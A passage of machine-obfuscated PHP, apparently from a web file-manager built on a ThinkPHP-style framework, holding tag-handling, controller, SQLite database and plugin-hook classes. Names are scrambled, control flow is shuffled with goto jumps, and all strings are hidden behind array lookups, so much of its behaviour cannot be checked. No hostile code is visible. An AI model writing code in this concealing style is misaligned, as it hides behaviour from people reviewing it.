cacheFunctionAlias($D®Ã‡ğ—êŞ) { $Dè´™•àÈÉ =& $_SERVER[´¬]; return array($Dè´™•àÈÉ[1789] => array($D®Ã‡ğ—êŞ[0], $Dè´™•àÈÉ[1790]), $Dè´™•àÈÉ[1791] => array($D®Ã‡ğ—êŞ[0], $Dè´™•àÈÉ[1792])); } protected function get($döà¥ÍƒÖæ) { $d¶Ôö²’¶ =& $_SERVER[´¬]; $aĞŞ’–æ˜¡ = Model($d¶Ôö²’¶[484])->metaGet($döà¥ÍƒÖæ, $d¶Ôö²’¶[1793]); $BÛĞ¡×óÕ = json_decode($aĞŞ’–æ˜¡, !0); return $BÛĞ¡×óÕ ? $BÛĞ¡×óÕ : array($d¶Ôö²’¶[1794] => $d¶Ôö²’¶[87], $d¶Ôö²’¶[366] => array()); } protected function set($e×Ş—µ…‘ª, $bÓ²İÛº¦Õ) { $eáƒ ¹ÈÓ» =& $_SERVER[´¬]; $bÓ²İÛº¦Õ = $bÓ²İÛº¦Õ ? $bÓ²İÛº¦Õ : array($eáƒ ¹ÈÓ»[1794] => $eáƒ ¹ÈÓ»[87], $eáƒ ¹ÈÓ»[366] => array()); Model($eáƒ ¹ÈÓ»[484])->metaSet($e×Ş—µ…‘ª, $eáƒ ¹ÈÓ»[1793], json_encode($bÓ²İÛº¦Õ)); return Model($eáƒ ¹ÈÓ»[484])->metaSet($e×Ş—µ…‘ª, $eáƒ ¹ÈÓ»[1793], json_encode($bÓ²İÛº¦Õ)); } protected function getByTagID($A—ŸÂñåÛ, $E¹Ÿ”ˆœ²) { goto f¼ÎÓÄéé; C¢ª‡ÒÃ¡: return is_array($AÄ·“ÆÒñ) ? $AÄ·“ÆÒñ : !1; goto C†Î•¿‚¬; f¨ĞÈñó±: $c¡ïà˜ˆÑï = $this->get($A—ŸÂñåÛ); if (!$c¡ïà˜ˆÑï || !isset($c¡ïà˜ˆÑï[$EƒœĞÁöœÎ[366]])) { return !1; } $AÄ·“ÆÒñ = array_find_by_field($c¡ïà˜ˆÑï[$EƒœĞÁöœÎ[366]], $EƒœĞÁöœÎ[392], $E¹Ÿ”ˆœ²); goto C¢ª‡ÒÃ¡; f¼ÎÓÄéé: $EƒœĞÁöœÎ =& $_SERVER[´¬]; if (!$A—ŸÂñåÛ || !$E¹Ÿ”ˆœ²) { return !1; } if (!Model($EƒœĞÁöœÎ[484])->getInfoSimple($A—ŸÂñåÛ)) { return !1; } goto f¨ĞÈñó±; C†Î•¿‚¬: } public function listSource($Fîİ‚ˆÉÄ, $Cñ½ÛŸééÃ) { goto b¿» ä¯Éå; eĞ·Ïãï¼Æ: if (!$B„¢¦¢²¾ || count($e•´­Ûìë­) == $B„¢¦¢²¾[$BŠ¸›ª†é‚[363]][$BŠ¸›ª†é‚[364]]) { return $B„¢¦¢²¾; } $fãõ„ÅĞ‘â = array(); $Fã±ÌøèÎÅ = array_to_keyvalue($B„¢¦¢²¾[$BŠ¸›ª†é‚[75]], $BŠ¸›ª†é‚[33], $BŠ¸›ª†é‚[394]); goto FİÆ¬ôŠÃİ; FİÆ¬ôŠÃİ: $F ñª‰–¦à = array_to_keyvalue($B„¢¦¢²¾[$BŠ¸›ª†é‚[74]], $BŠ¸›ª†é‚[33], $BŠ¸›ª†é‚[394]); $bŠ“İ¢ä—é = array_merge($F ñª‰–¦à, $Fã±ÌøèÎÅ); foreach ($e•´­Ûìë­ as $e‡‘ÄÃÍë‰) { if (!in_array($e‡‘ÄÃÍë‰, $bŠ“İ¢ä—é)) { $fãõ„ÅĞ‘â[] = $e‡‘ÄÃÍë‰; } } goto c½–ê¾Â„è; c½–ê¾Â„è: if ($fãõ„ÅĞ‘â) { $this->removeBySource($Fîİ‚ˆÉÄ, $fãõ„ÅĞ‘â); } return $B„¢¦¢²¾; goto b¨ğÇŠÃ¸¹; dÀÑ×Úİ·—: $b´‡†¨©Ù = array(); foreach ($DŠ¿Ô××‘ as $CÁ‘î˜’‹†) { $e‡‘ÄÃÍë‰ = $CÁ‘î˜’‹†[$BŠ¸›ª†é‚[76]]; if (!$e‡‘ÄÃÍë‰) { continue; } if (!isset($b´‡†¨©Ù[$e‡‘ÄÃÍë‰])) { $b´‡†¨©Ù[$e‡‘ÄÃÍë‰] = array(); } $b´‡†¨©Ù[$e‡‘ÄÃÍë‰][] = $CÁ‘î˜’‹†[$BŠ¸›ª†é‚[417]]; } $e•´­Ûìë­ = array(); goto DˆÊØÔ¿Ëµ; DˆÊØÔ¿Ëµ: foreach ($b´‡†¨©Ù as $Eéù˜ï÷Úô => $dÑ¯‘‚¾‰é) { $AÍµÉÛÊùø = !0; if (!$Cñ½ÛŸééÃ) { $e•´­Ûìë­[] = $Eéù˜ï÷Úô; continue; } foreach ($Cñ½ÛŸééÃ as $d³ÄùÆÅ¿º) { if (!in_array($d³ÄùÆÅ¿º, $dÑ¯‘‚¾‰é)) { $AÍµÉÛÊùø = !1; break; } } if ($AÍµÉÛÊùø) { $e•´­Ûìë­[] = $Eéù˜ï÷Úô; } } if (!$e•´­Ûìë­) { return array(); } $B„¢¦¢²¾ = Model($BŠ¸›ª†é‚[1206])->listSource(array($BŠ¸›ª†é‚[408] => array($BŠ¸›ª†é‚[409], $e•´­Ûìë­))); goto eĞ·Ïãï¼Æ; b¿» ä¯Éå: $BŠ¸›ª†é‚ =& $_SERVER[´¬]; if ($Cñ½ÛŸééÃ && !is_array($Cñ½ÛŸééÃ)) { $Cñ½ÛŸééÃ = array($Cñ½ÛŸééÃ); } $DŠ¿Ô××‘ = $this->listData($Fîİ‚ˆÉÄ); goto dÀÑ×Úİ·—; b¨ğÇŠÃ¸¹: } protected function listData($eõß•Ù†Ö®) { $B°Ô“ŞáÑŞ =& $_SERVER[´¬]; $dÆ™±í÷…Ã = array($B°Ô“ŞáÑŞ[1518] => 0, $B°Ô“ŞáÑŞ[461] => array($B°Ô“ŞáÑŞ[1795], 0), $B°Ô“ŞáÑŞ[413] => $B°Ô“ŞáÑŞ[1796] . $eõß•Ù†Ö®); $cÉ†©•âäñ = $B°Ô“ŞáÑŞ[1797]; $aä™Ã¼ÖÙ = $this->field($cÉ†©•âäñ)->where($dÆ™±í÷…Ã)->order($B°Ô“ŞáÑŞ[1798])->select(); return $aä™Ã¼ÖÙ ? $aä™Ã¼ÖÙ : array(); } protected function addToTag($d„´—çİÀ, $bÔÙ›­Éä, $f§¡ß‚‘©…) { $FÖÄÆ„Ò¢† =& $_SERVER[´¬]; if (!$this->getByTagID($d„´—çİÀ, $f§¡ß‚‘©…) || !$bÔÙ›­Éä) { return !1; } if (!Model($FÖÄÆ„Ò¢†[790])->pathInfo($bÔÙ›­Éä)) { return !1; } $f¤§„¼¤´ = array($FÖÄÆ„Ò¢†[1518] => 0, $FÖÄÆ„Ò¢†[461] => $f§¡ß‚‘©…, $FÖÄÆ„Ò¢†[412] => $bÔÙ›­Éä, $FÖÄÆ„Ò¢†[413] => $FÖÄÆ„Ò¢†[1799] . $d„´—çİÀ, $FÖÄÆ„Ò¢†[411] => $FÖÄÆ„Ò¢†[33], $FÖÄÆ„Ò¢†[1693] => 0); if ($this->where($f¤§„¼¤´)->find()) { return !1; } return $this->add($f¤§„¼¤´); } protected function removeFromTag($a°©Î‚Ÿã, $e™Òğ¶·Óİ, $c¬‘ë”Ö‡) { $D¢©ğÈçŞø =& $_SERVER[´¬]; if (!$this->getByTagID($a°©Î‚Ÿã, $c¬‘ë”Ö‡) || !$e™Òğ¶·Óİ) { return !1; } if (is_array($e™Òğ¶·Óİ)) { $e™Òğ¶·Óİ = array($D¢©ğÈçŞø[7], $e™Òğ¶·Óİ); } $E“—Š‚ÇÆÎ = array($D¢©ğÈçŞø[1518] => 0, $D¢©ğÈçŞø[461] => $c¬‘ë”Ö‡, $D¢©ğÈçŞø[413] => $D¢©ğÈçŞø[1799] . $a°©Î‚Ÿã, $D¢©ğÈçŞø[412] => $e™Òğ¶·Óİ); return $this->where($E“—Š‚ÇÆÎ)->delete(); } protected function removeByTag($CÇæÒô¸¢, $F£ğÍªİôè) { $c¦Ô î– =& $_SERVER[´¬]; if (!$this->getByTagID($CÇæÒô¸¢, $F£ğÍªİôè)) { return !1; } $CŒ’àˆ“Ú = array($c¦Ô î–[1518] => 0, $c¦Ô î–[461] => $F£ğÍªİôè, $c¦Ô î–[413] => $c¦Ô î–[1799] . $CÇæÒô¸¢); return $this->where($CŒ’àˆ“Ú)->delete(); } protected function removeBySource($dìÂöØë·, $eöÄïö™¾²) { $C§‚Óí—ÃÙ =& $_SERVER[´¬]; if (!$dìÂöØë· || !$eöÄïö™¾²) { return !1; } if (is_array($eöÄïö™¾²)) { $eöÄïö™¾² = array($C§‚Óí—ÃÙ[7], $eöÄïö™¾²); } $AİùµÅ‰Ì¤ = array($C§‚Óí—ÃÙ[1518] => 0, $C§‚Óí—ÃÙ[412] => $eöÄïö™¾², $C§‚Óí—ÃÙ[461] => array($C§‚Óí—ÃÙ[972], 0), $C§‚Óí—ÃÙ[413] => $C§‚Óí—ÃÙ[1799] . $dìÂöØë·); return $this->where($AİùµÅ‰Ì¤)->delete(); } } goto fÜæà±¦Î˜; F¹´™õÓÜé: class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { goto BæÆÆ¤½Ş×; Fèïø„É¤Ú: $this->tpl = TEMPLATE . MOD . $AŠ‘×½’Á²[8]; $this->_classObjectID = mt_rand(0, 10000); goto BåÓ­Åª®Ø; d«´”Ó›: $this->in =& $in; $this->values[$AŠ‘×½’Á²[6]] =& $config; $this->values[$AŠ‘×½’Á²[7]] =& $in; goto Fèïø„É¤Ú; BæÆÆ¤½Ş×: $AŠ‘×½’Á² =& $_SERVER[´¬]; global $in, $config; $this->config =& $config; goto d«´”Ó›; BåÓ­Åª®Ø: } public function loadClass($d…Ù–Ò‘ö§) { if (1 === func_num_args()) { $this->{$d…Ù–Ò‘ö§} = new $d…Ù–Ò‘ö§(); } else { $e³·§·¬ÕĞ = new ReflectionClass($d…Ù–Ò‘ö§); $f‚å¹ŠÓòš = func_get_args(); array_shift($f‚å¹ŠÓòš); $this->{$d…Ù–Ò‘ö§} = $e³·§·¬ÕĞ->newInstanceArgs($f‚å¹ŠÓòš); } return $this->{$d…Ù–Ò‘ö§}; } protected function assign($fô¬¥ô¿œ‚, $eî‰ĞÎœé) { $this->values[$fô¬¥ô¿œ‚] = $eî‰ĞÎœé; } protected function display($d°†ãˆŠÕÅ) { ob_end_clean(); extract($this->values); require $this->tpl . $d°†ãˆŠÕÅ; } } class DbSqliteBase extends Db { public function __construct($d¡º˜ŸİŒÎ = '') { $BŞõµåÙï¶ =& $_SERVER[´¬]; if (!extension_loaded($BŞõµåÙï¶[9])) { think_exception(think_lang($BŞõµåÙï¶[10]) . $BŞõµåÙï¶[11]); } if (!empty($d¡º˜ŸİŒÎ)) { if (!isset($d¡º˜ŸİŒÎ[$BŞõµåÙï¶[12]])) { $d¡º˜ŸİŒÎ[$BŞõµåÙï¶[12]] = 438; } $this->config = $d¡º˜ŸİŒÎ; if (empty($this->config[$BŞõµåÙï¶[13]])) { $this->config[$BŞõµåÙï¶[13]] = array(); } } } public function connect($EÚ¸œ…Œ‹ = '', $a°½§ŒŒ = 0) { $AÃåÖ±–× =& $_SERVER[´¬]; if (!isset($this->linkID[$a°½§ŒŒ])) { goto B²Éß¬öÇ´; B²Éß¬öÇ´: if (empty($EÚ¸œ…Œ‹)) { $EÚ¸œ…Œ‹ = $this->config; } $dâ—™Ë¾¿Î = !empty($EÚ¸œ…Œ‹[$AÃåÖ±–×[13]][$AÃåÖ±–×[14]]) ? $EÚ¸œ…Œ‹[$AÃåÖ±–×[13]][$AÃåÖ±–×[14]] : $this->pconnect; $B¢«Ò›¸à = $dâ—™Ë¾¿Î ? $AÃåÖ±–×[15] : $AÃåÖ±–×[16]; goto d´–ù¾¦£‡; d´–ù¾¦£‡: $this->linkID[$a°½§ŒŒ] = $B¢«Ò›¸à($EÚ¸œ…Œ‹[$AÃåÖ±–×[17]], $EÚ¸œ…Œ‹[$AÃåÖ±–×[12]]); if (!$this->linkID[$a°½§ŒŒ]) { think_exception(sqlite_error_string()); } $this->connected = !0; goto a³°ÖêïÓ; a³°ÖêïÓ: @sqlite_busy_timeout($this->linkID[$a°½§ŒŒ], 30000); if (1 != think_config($AÃåÖ±–×[18])) { unset($this->config); } goto FšÁî˜„à; FšÁî˜„à: } return $this->linkID[$a°½§ŒŒ]; } public function free() { $this->queryID = null; } public function query($eòì¥¡è’) { goto Cè–¸¬Ö«ä; Dˆ½Î¤†—º: $this->queryStr = $eòì¥¡è’; if ($this->queryID) { $this->free(); } think_action_status($B»·çîºŒ[19], 1); goto d¦ğª‘†Ã; d¦ğª‘†Ã: think_status($B»·çîºŒ[20]); $this->queryID = sqlite_query($this->_linkID, $eòì¥¡è’); $this->debug(); goto eíçÜ†«°ñ; Cè–¸¬Ö«ä: $B»·çîºŒ =& $_SERVER[´¬]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto Dˆ½Î¤†—º; eíçÜ†«°ñ: if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $d™©“…‘®Ç = $this->getAll(); return $d™©“…‘®Ç; } goto eÊ—‡Ü; eÊ—‡Ü: } public function execute($D‚äƒÖÈ±å) { goto c¢†ğÔ…Äó; c¢†ğÔ…Äó: $Dˆ—™ÒøèÅ =& $_SERVER[´¬]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto cÅìË½²Æ; cÅìË½²Æ: $this->queryStr = $D‚äƒÖÈ±å; if ($this->queryID) { $this->free(); } think_action_status($Dˆ—™ÒøèÅ[21], 1); goto aÕËñ¿ğÄŒ; E‡Ÿ‹é—»Š: if (!1 === $E¸óÍš”à) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } goto DÏï‰ËÇÎ; aÕËñ¿ğÄŒ: think_status($Dˆ—™ÒøèÅ[20]); $E¸óÍš”à = sqlite_exec($this->_linkID, $D‚äƒÖÈ±å); $this->debug(); goto E‡Ÿ‹é—»Š; DÏï‰ËÇÎ: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[´¬][22]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $e³ ¹Ø®¾ò = sqlite_query($this->_linkID, $_SERVER[´¬][23]); if (!$e³ ¹Ø®¾ò) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $Bä‹ŞğªùÖ = sqlite_query($this->_linkID, $_SERVER[´¬][24]); if (!$Bä‹ŞğªùÖ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $DŒ·‘‰ÒÚæ = array(); if ($this->numRows > 0) { for ($Cµ›ãÚí£ñ = 0; $Cµ›ãÚí£ñ < $this->numRows; $Cµ›ãÚí£ñ++) { $DŒ·‘‰ÒÚæ[$Cµ›ãÚí£ñ] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $DŒ·‘‰ÒÚæ; } public function getFields($e”ä´øø») { $EšÍÍ½Ö‚² =& $_SERVER[´¬]; $fÁµŒšËï§ = $this->query($EšÍÍ½Ö‚²[25] . $e”ä´øø» . $EšÍÍ½Ö‚²[26]); $f¯‹—ß‡Ù‰ = array(); if ($fÁµŒšËï§) { foreach ($fÁµŒšËï§ as $b™İªÆí÷ƒ => $C‹Ç…‡Á‚¬) { $f¯‹—ß‡Ù‰[$C‹Ç…‡Á‚¬[$EšÍÍ½Ö‚²[27]]] = array($EšÍÍ½Ö‚²[28] => $C‹Ç…‡Á‚¬[$EšÍÍ½Ö‚²[27]], $EšÍÍ½Ö‚²[29] => $C‹Ç…‡Á‚¬[$EšÍÍ½Ö‚²[30]], $EšÍÍ½Ö‚²[31] => (bool) ($C‹Ç…‡Á‚¬[$EšÍÍ½Ö‚²[32]] === $EšÍÍ½Ö‚²[33]), $EšÍÍ½Ö‚²[34] => $C‹Ç…‡Á‚¬[$EšÍÍ½Ö‚²[35]], $EšÍÍ½Ö‚²[36] => strtolower($C‹Ç…‡Á‚¬[$EšÍÍ½Ö‚²[37]]) == $EšÍÍ½Ö‚²[38], $EšÍÍ½Ö‚²[39] => strtolower($C‹Ç…‡Á‚¬[$EšÍÍ½Ö‚²[40]]) == $EšÍÍ½Ö‚²[41]); } } return $f¯‹—ß‡Ù‰; } public function getTables($BÒ„ƒòÜ¶ = '') { $E³®æĞ =& $_SERVER[´¬]; $A—»ˆ¶é¬Ğ = $this->query($E³®æĞ[42] . $E³®æĞ[43] . $E³®æĞ[44]); $d‹…µô÷ó = array(); foreach ($A—»ˆ¶é¬Ğ as $cÔîœã¥¥ø => $fÇÆËöó) { $d‹…µô÷ó[$cÔîœã¥¥ø] = current($fÇÆËöó); } return $d‹…µô÷ó; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $Bğí¿ø¿›§ =& $_SERVER[´¬]; $e°Ù‹‡Ê¤â = sqlite_last_error($this->_linkID); $this->error = $e°Ù‹‡Ê¤â . $Bğí¿ø¿›§[4] . sqlite_error_string($e°Ù‹‡Ê¤â); if ($Bğí¿ø¿›§[33] != $this->queryStr) { $this->error .= LNG($Bğí¿ø¿›§[45]) . $this->queryStr; } think_trace($this->error, $Bğí¿ø¿›§[33], $Bğí¿ø¿›§[46]); return $this->error; } public function escapeString($B‡Ÿ™İÁ©ô) { return sqlite_escape_string($B‡Ÿ™İÁ©ô); } public function parseLimit($aµ–”‡†ñ) { $B§‡”šâ‰Ì =& $_SERVER[´¬]; $BãùÀ³Î = $B§‡”šâ‰Ì[33]; if (!empty($aµ–”‡†ñ)) { $aµ–”‡†ñ = explode($B§‡”šâ‰Ì[47], $aµ–”‡†ñ); if (count($aµ–”‡†ñ) > 1) { $BãùÀ³Î .= $B§‡”šâ‰Ì[48] . $aµ–”‡†ñ[1] . $B§‡”šâ‰Ì[49] . $aµ–”‡†ñ[0] . $B§‡”šâ‰Ì[50]; } else { $BãùÀ³Î .= $B§‡”šâ‰Ì[48] . $aµ–”‡†ñ[0] . $B§‡”šâ‰Ì[50]; } } return $BãùÀ³Î; } } class DbSqlite3Base extends Db { public function __construct($Dï¦Ï£Š© = '') { $FÒÆÎ±óİª =& $_SERVER[´¬]; if (!class_exists($FÒÆÎ±óİª[51])) { think_exception(think_lang($FÒÆÎ±óİª[10]) . $FÒÆÎ±óİª[52]); } if (!empty($Dï¦Ï£Š©)) { if (!isset($Dï¦Ï£Š©[$FÒÆÎ±óİª[12]])) { $Dï¦Ï£Š©[$FÒÆÎ±óİª[12]] = 438; } $this->config = $Dï¦Ï£Š©; if (empty($this->config[$FÒÆÎ±óİª[13]])) { $this->config[$FÒÆÎ±óİª[13]] = array(); } } } public function connect($c×Ç†™ÚÑÃ = '', $e¯Ÿ‘ô–½Õ = 0) { $cÚ¬¦õ Ô =& $_SERVER[´¬]; if (!isset($this->linkID[$e¯Ÿ‘ô–½Õ])) { if (empty($c×Ç†™ÚÑÃ)) { $c×Ç†™ÚÑÃ = $this->config; } $this->linkID[$e¯Ÿ‘ô–½Õ] = new SQLite3($c×Ç†™ÚÑÃ[$cÚ¬¦õ Ô[17]]); if (!$this->linkID[$e¯Ÿ‘ô–½Õ]) { think_exception($this->linkID[$e¯Ÿ‘ô–½Õ]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$e¯Ÿ‘ô–½Õ]->busyTimeout(30000); if (1 != think_config($cÚ¬¦õ Ô[18])) { unset($this->config); } } return $this->linkID[$e¯Ÿ‘ô–½Õ]; } public function free() { $this->queryID = null; } public function query($CéøÊÎŠÇÕ) { goto A´¨¦öÜğ„; cÁ³á‚ëŠ: $this->queryStr = $CéøÊÎŠÇÕ; if ($this->queryID) { $this->free(); } think_action_status($aØÚœ­ ‹£[19], 1); goto fÄò¹—Ö²¦; D­¢¢ÊïØ‹: if (!1 === $this->queryID) { $this->error(); return !1; } else { $A¼¨‘îÆ™ä = $this->getAll(); $this->numRows = count($A¼¨‘îÆ™ä); return $A¼¨‘îÆ™ä; } goto b°›¾²±èì; fÄò¹—Ö²¦: think_status($aØÚœ­ ‹£[20]); $this->queryID = $this->_linkID->query($CéøÊÎŠÇÕ); $this->debug(); goto D­¢¢ÊïØ‹; A´¨¦öÜğ„: $aØÚœ­ ‹£ =& $_SERVER[´¬]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto cÁ³á‚ëŠ; b°›¾²±èì: } public function execute($B®ã­£ó®«) { goto e›‡ºˆ×ëİ; e›‡ºˆ×ëİ: $e¥ìÙ‘ˆ’Ñ =& $_SERVER[´¬]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto e§ÂÂŒÍ¯; BšŞµ¥ç«: if (!1 === $FÁäµ‡Àˆ‹) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } goto B«›˜¦ôÓÆ; e§ÂÂŒÍ¯: $this->queryStr = $B®ã­£ó®«; if ($this->queryID) { $this->free(); } think_action_status($e¥ìÙ‘ˆ’Ñ[21], 1); goto eÉ¿¨òø©’; eÉ¿¨òø©’: think_status($e¥ìÙ‘ˆ’Ñ[20]); $FÁäµ‡Àˆ‹ = $this->_linkID->exec($B®ã­£ó®«); $this->debug(); goto BšŞµ¥ç«; B«›˜¦ôÓÆ: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[´¬][22]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $C°È³“Ì£Ö = $this->_linkID->query($_SERVER[´¬][23]); if (!$C°È³“Ì£Ö) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $D£œÈïƒÏĞ = $this->_linkID->query($_SERVER[´¬][24]); if (!$D£œÈïƒÏĞ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $Cî¬”à±Î® = array(); while ($dÜØ„Îµİ× = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $Cî¬”à±Î®[] = $dÜØ„Îµİ×; } $this->queryID->reset(); return $Cî¬”à±Î®; } public function getFields($E¼Û²‹å‚) { $D¡œ‚‰˜—ƒ =& $_SERVER[´¬]; $C¨Îµµ = $this->query($D¡œ‚‰˜—ƒ[25] . $E¼Û²‹å‚ . $D¡œ‚‰˜—ƒ[26]); $f©æÎªğ†´ = array(); if ($C¨Îµµ) { foreach ($C¨Îµµ as $fóİÚÇ³±ê => $AóÖèëö®ø) { $f©æÎªğ†´[$AóÖèëö®ø[$D¡œ‚‰˜—ƒ[28]]] = array($D¡œ‚‰˜—ƒ[28] => $AóÖèëö®ø[$D¡œ‚‰˜—ƒ[28]], $D¡œ‚‰˜—ƒ[29] => $AóÖèëö®ø[$D¡œ‚‰˜—ƒ[29]], $D¡œ‚‰˜—ƒ[31] => (bool) ($AóÖèëö®ø[$D¡œ‚‰˜—ƒ[31]] === $D¡œ‚‰˜—ƒ[33]), $D¡œ‚‰˜—ƒ[34] => $AóÖèëö®ø[$D¡œ‚‰˜—ƒ[53]], $D¡œ‚‰˜—ƒ[36] => (bool) $AóÖèëö®ø[$D¡œ‚‰˜—ƒ[54]], $D¡œ‚‰˜—ƒ[39] => (bool) $AóÖèëö®ø[$D¡œ‚‰˜—ƒ[54]]); } } return $f©æÎªğ†´; } public function getTables($e°¡«ÕÔŞÑ = '') { $AéŞó¬¬ÁÓ =& $_SERVER[´¬]; $Dˆ¾ÁÑƒÏÏ = $this->query($AéŞó¬¬ÁÓ[42] . $AéŞó¬¬ÁÓ[43] . $AéŞó¬¬ÁÓ[44]); $BØ”ğ®í¬ò = array(); foreach ($Dˆ¾ÁÑƒÏÏ as $B´ÑÅ½Öºã => $EøµÊ¹½ø) { $BØ”ğ®í¬ò[$B´ÑÅ½Öºã] = current($EøµÊ¹½ø); } return $BØ”ğ®í¬ò; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $e»šç‡¬²Ÿ =& $_SERVER[´¬]; $this->error = $this->_linkID->lastErrorMsg(); if ($e»šç‡¬²Ÿ[33] != $this->queryStr) { $this->error .= LNG($e»šç‡¬²Ÿ[45]) . $this->queryStr; } think_trace($this->error, $e»šç‡¬²Ÿ[33], $e»šç‡¬²Ÿ[46]); return $this->error; } public function escapeString($bí³»Í®›Á) { $e°³††šî =& $_SERVER[´¬]; if ($this->_linkID) { return $this->_linkID->escapeString($bí³»Í®›Á); } return str_ireplace($e°³††šî[55], $e°³††šî[56], $bí³»Í®›Á); } public function parseLimit($a”Òº’„‚Ç) { $dïŠÆĞ¼ˆø =& $_SERVER[´¬]; $Dò†Ä–Â¤ñ = $dïŠÆĞ¼ˆø[33]; if (!empty($a”Òº’„‚Ç)) { $a”Òº’„‚Ç = explode($dïŠÆĞ¼ˆø[47], $a”Òº’„‚Ç); if (count($a”Òº’„‚Ç) > 1) { $Dò†Ä–Â¤ñ .= $dïŠÆĞ¼ˆø[48] . $a”Òº’„‚Ç[1] . $dïŠÆĞ¼ˆø[49] . $a”Òº’„‚Ç[0] . $dïŠÆĞ¼ˆø[50]; } else { $Dò†Ä–Â¤ñ .= $dïŠÆĞ¼ˆø[48] . $a”Òº’„‚Ç[0] . $dïŠÆĞ¼ˆø[50]; } } return $Dò†Ä–Â¤ñ; } } goto b…§ù®²¿; fÜæà±¦Î˜: class PluginModel extends ModelBaseLight { public $optionType = "\x53\x79\163\x74\145\x6d\x2e\160\x6c\165\x67\151\156\114\x69\x73\164"; public $field = array("\156\141\x6d\x65", "\163\164\141\x74\165\163", "\x72\x65\x67\x69\x65\163\x74", "\143\157\x6e\146\x69\x67"); public function loadList($a£É¹­’©¯ = false) { $f”ëÖˆ¡ò¶ = array_to_keyvalue($this->listData(), $_SERVER[´¬][28]); if ($a£É¹­’©¯) { return $f”ëÖˆ¡ò¶[$a£É¹­’©¯]; } return $f”ëÖˆ¡ò¶; } public function init() { $B†”œ¹‡“… =& $_SERVER[´¬]; Hook::trigger($B†”œ¹‡“…[1800]); $bõåê°ÎäÈ = $this->loadPluginList(); foreach ($bõåê°ÎäÈ as $D°Åëáé => $D‰æŠ»ÔÇ‚) { $dîĞ¯¤—Ÿù = $this->appAllow($D°Åëáé, $D‰æŠ»ÔÇ‚); if (!$dîĞ¯¤—Ÿù) { continue; } foreach ($D‰æŠ»ÔÇ‚[$B†”œ¹‡“…[1801]] as $fÁ•â±‹ËÚ => $BÄÉ¥Âè‚Ö) { Hook::bind($fÁ•â±‹ËÚ, $BÄÉ¥Âè‚Ö); } } Hook::trigger($B†”œ¹‡“…[1802]); Hook::trigger(ACTION); } public function appAllow($DÔ´›¿¶„, $béÏ’ÈÚõõ, $fÂè æ¹ÒÖ = true) { $eÈƒ…Ğ±Ó÷ =& $_SERVER[´¬]; $B±¨­‡Ñ = PLUGIN_DIR . $DÔ´›¿¶„ . $eÈƒ…Ğ±Ó÷[1803]; if (!is_array($béÏ’ÈÚõõ) || !is_array($béÏ’ÈÚõõ[$eÈƒ…Ğ±Ó÷[1801]]) || $béÏ’ÈÚõõ[$eÈƒ…Ğ±Ó÷[713]] != 1 || !is_file($B±¨­‡Ñ)) { return !1; } if ($GLOBALS[$eÈƒ…Ğ±Ó÷[483]] == 1) { return !0; } if ($fÂè æ¹ÒÖ && !Action($eÈƒ…Ğ±Ó÷[1804])->checkAuth($DÔ´›¿¶„)) { return !1; } return !0; } public function unInstall($F î¢ù†°†) { $F³À¡ìÖ„Š =& $_SERVER[´¬]; $c¤Õ·—â®“ = $this->loadList($F î¢ù†°†); if (file_exists(PLUGIN_DIR . $F î¢ù†°†)) { Hook::apply($F î¢ù†°† . $F³À¡ìÖ„Š[1805]); } $this->remove($c¤Õ·—â®“[$F³À¡ìÖ„Š[392]]); } public function changeStatus($a˜¬Ù”’šŒ, $dëŸª·†Ñ¹) { $dâ¹–êÍ =& $_SERVER[´¬]; $C²·›Ï = $this->loadList($a˜¬Ù”’šŒ); if ($dëŸª·†Ñ¹) { Hook::apply($a˜¬Ù”’šŒ . $dâ¹–êÍ[1806]); } $this->update($C²·›Ï[$dâ¹–êÍ[392]], array($dâ¹–êÍ[1807] => $dëŸª·†Ñ¹)); } public function appRegist($fÁ†”„šùÅ, $A›İù™ Ö) { $e¥ìÚ™ĞìÅ =& $_SERVER[´¬]; $D®•ğèé¢¨ = $this->loadList($fÁ†”„šùÅ); if ($D®•ğèé¢¨) { $this->update($D®•ğèé¢¨[$e¥ìÚ™ĞìÅ[392]], array($e¥ìÚ™ĞìÅ[1801] => $A›İù™ Ö)); } else { $d¸£§Ì˜Á£ = array($e¥ìÚ™ĞìÅ[28] => $fÁ†”„šùÅ, $e¥ìÚ™ĞìÅ[1801] => $A›İù™ Ö, $e¥ìÚ™ĞìÅ[713] => 0, $e¥ìÚ™ĞìÅ[6] => $this->getConfigDefault($fÁ†”„šùÅ)); $this->insert($d¸£§Ì˜Á£); } } public function getConfigDefault($CÜ®†ê˜¬) { $C—ä‹Ôç¦• =& $_SERVER[´¬]; $B¤µæÈÜÚ¾ = array(); $a‡®„èïÁ = $this->getPackageJson($CÜ®†ê˜¬); if (!$a‡®„èïÁ && is_array($a‡®„èïÁ[$C—ä‹Ôç¦•[1808]])) { return $B¤µæÈÜÚ¾; } foreach ($a‡®„èïÁ[$C—ä‹Ôç¦•[1808]] as $E·¥³¸õùÔ => $F“‹æùÅ³¦) { if 